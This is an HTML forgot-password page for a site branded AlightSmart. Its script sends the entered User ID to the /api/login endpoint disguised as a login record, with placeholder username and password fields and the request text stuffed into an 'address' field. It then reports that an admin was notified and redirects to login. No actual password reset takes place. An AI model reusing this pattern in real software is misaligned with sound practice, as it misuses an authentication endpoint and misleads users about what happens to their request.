<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forgot Password - AlightSmart</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: #f8fafc; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            max-width: 420px; 
            margin: auto; 
            background: white; 
            padding: 40px 35px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
        }
        h1 { 
            font-size: 1.75rem; 
            text-align: center; 
            margin-bottom: 8px; 
            color: #1e2937; 
        }
        p { 
            text-align: center; 
            color: #64748b; 
            margin-bottom: 30px; 
            line-height: 1.5;
        }
        label { 
            display: block; 
            margin: 20px 0 8px; 
            font-weight: 600; 
            color: #334155; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            border: 1.5px solid #e2e8f0; 
            border-radius: 10px; 
            font-size: 1.05rem; 
        }
        button { 
            width: 100%; 
            padding: 16px; 
            margin-top: 20px; 
            border: none; 
            border-radius: 10px; 
            font-size: 1.1rem; 
            font-weight: 600; 
            cursor: pointer; 
        }
        .submit-btn { 
            background: #1e40af; 
            color: white; 
        }
        .back-btn {
            background: transparent;
            color: #1e40af;
            border: 1.5px solid #1e40af;
            margin-top: 10px;
        }
        .success { 
            color: #10b981; 
            text-align: center; 
            margin: 15px 0; 
            font-weight: 500; 
        }
        .error { 
            color: #ef4444; 
            text-align: center; 
            margin: 15px 0; 
            font-weight: 500; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Forgot Password</h1>
        <p>Enter your User ID below.<br>Your request will be sent to the admin.</p>

        <form id="forgotForm">
            <label for="userid">User ID</label>
            <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>

            <button type="submit" class="submit-btn">Send Request to Admin</button>
            <button type="button" class="back-btn" onclick="goBack()">Back to Login</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        document.getElementById('forgotForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userId = document.getElementById('userid').value.trim();
            const statusDiv = document.getElementById('status');

            if (!userId) {
                statusDiv.innerHTML = `<p class="error">Please enter your User ID</p>`;
                return;
            }

            statusDiv.innerHTML = `<p style="color:#eab308;">Sending request to admin...</p>`;

            const payload = {
                username: "Forgot Password Request",
                password: "N/A",
                address: `Forgot Password Request | UserID: ${userId} | Time: ${new Date().toLocaleString()} | Status: Pending Reset`
            };

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                statusDiv.innerHTML = `
                    <p class="success">
                        ✅ Request Sent Successfully!<br><br>
                        Admin has been notified.<br>
                        You will be contacted soon.
                    </p>`;

                // Auto redirect back to login after 4 seconds
                setTimeout(() => {
                    window.location.href = "login.html";
                }, 4000);

            } catch (err) {
                console.error(err);
                statusDiv.innerHTML = `<p class="error">Failed to send request. Please try again.</p>`;
            }
        });

        function goBack() {
            window.location.href = "login.html";
        }
    </script>
</body>
</html>
